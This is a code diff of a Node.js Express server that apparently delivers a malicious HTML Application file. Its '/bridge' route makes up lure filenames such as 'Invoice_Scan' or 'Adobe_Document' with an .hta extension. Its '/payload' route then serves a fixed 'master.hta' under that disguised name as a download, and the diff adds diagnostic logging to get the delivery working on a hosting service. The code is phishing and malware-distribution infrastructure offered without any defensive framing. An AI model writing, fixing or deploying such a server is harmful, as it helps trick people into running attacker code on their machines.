@@ -6,50 +6,56 @@ const fs = require('fs');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// ✅ BRIDGE: Generates unique .hta name & redirects
+// Log public folder contents ONCE at startup for debugging
+const publicDir = path.join(__dirname, 'public');
+console.log('[STARTUP] __dirname:', __dirname);
+console.log('[STARTUP] publicDir:', publicDir);
+if (fs.existsSync(publicDir)) {
+    console.log('[STARTUP] public/ contents:', fs.readdirSync(publicDir));
+} else {
+    console.error('[STARTUP] ERROR: public/ directory does not exist!');
+}
+
+// BRIDGE
 app.get('/bridge', (req, res) => {
     const randomId = crypto.randomInt(100000, 999999);
     const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
     const theme = themes[Math.floor(Math.random() * themes.length)];
     const uniqueName = `${theme}_${randomId}.hta`;
-    
-    console.log(`[BRIDGE] Generated: ${uniqueName}`);
     res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
 });
 
-// ✅ PAYLOAD: Serves master.hta AS THE UNIQUE NAME FROM URL
+// PAYLOAD - WITH FULL DIAGNOSTICS
 app.get('/payload/:filename', (req, res) => {
-    const filePath = path.join(__dirname, 'public', 'master.hta');
+    const filePath = path.resolve(path.join(__dirname, 'public', 'master.hta'));
     
-    // CRITICAL LOGGING FOR RAILWAY CONSOLE
-    console.log(`[PAYLOAD] Requested filename: ${req.params.filename}`);
-    console.log(`[PAYLOAD] Actual file served: ${filePath}`);
-    console.log(`[PAYLOAD] File exists: ${fs.existsSync(filePath)}`);
+    console.log('[PAYLOAD] Requested:', req.params.filename);
+    console.log('[PAYLOAD] Resolved path:', filePath);
+    console.log('[PAYLOAD] File exists:', fs.existsSync(filePath));
+    
+    // List files in public/ on EVERY request to catch race conditions
+    try {
+        const files = fs.readdirSync(path.join(__dirname, 'public'));
+        console.log('[PAYLOAD] Current public/ files:', files);
+    } catch(e) {
+        console.error('[PAYLOAD] Cannot read public/ dir:', e.message);
+    }
     
     if (!fs.existsSync(filePath)) {
-        console.error('[PAYLOAD] ERROR: master.hta missing!');
-        return res.status(404).send('Source payload not found.');
+        return res.status(404).json({ 
+            error: 'master.hta not found', 
+            lookedAt: filePath,
+            publicContents: fs.existsSync(publicDir) ? fs.readdirSync(publicDir) : 'DIR_MISSING'
+        });
     }
 
-    // MANIPULATE THE DOWNLOAD NAME TO MATCH THE UNIQUE REQUESTED NAME
     res.setHeader('Content-Disposition', `attachment; filename="${req.params.filename}"`);
     res.setHeader('Content-Type', 'application/hta');
-    res.setHeader('X-Content-Type-Options', 'nosniff');
-    
-    res.sendFile(filePath, (err) => {
-        if (err) {
-            console.error(`[PAYLOAD] Send failed: ${err.message}`);
-            if (!res.headersSent) res.status(500).send('Download error.');
-        } else {
-            console.log(`[PAYLOAD] SUCCESS: Sent as "${req.params.filename}"`);
-        }
-    });
+    res.sendFile(filePath);
 });
 
-// ✅ SERVE ONLY HTML FILES MANUALLY (NO STATIC MIDDLEWARE INTERFERENCE)
+// Serve HTML files explicitly
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.get('/confirm.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'confirm.html')));
 
-app.get('/health', (req, res) => res.json({ status: 'ok' }));
-
-app.listen(port, () => console.log(`✅ Server running on port ${port}`));
+app.listen(port, () => console.log(`✅ Running on port ${port}`));
